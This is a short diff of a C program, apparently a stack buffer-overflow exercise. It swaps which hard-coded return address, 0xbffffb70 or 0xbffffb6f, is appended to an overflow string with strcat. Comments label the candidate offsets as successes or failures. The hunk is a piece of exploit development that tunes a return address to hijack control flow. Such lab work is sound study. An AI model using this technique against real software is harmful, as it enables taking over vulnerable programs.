@@ -29,10 +29,11 @@ int main(void)
   	// strcat(str, "\x20\xfb\xff\xbf");
 
     // success
-    // - 151
-  	strcat(str, "\x6f\xfb\xff\xbf");
     // - 150
-  	// strcat(str, "\x70\xfb\xff\xbf");
+  	strcat(str, "\x70\xfb\xff\xbf");
+    // - 151
+  	// strcat(str, "\x6f\xfb\xff\xbf");
+
 
     // failed
     // - 153
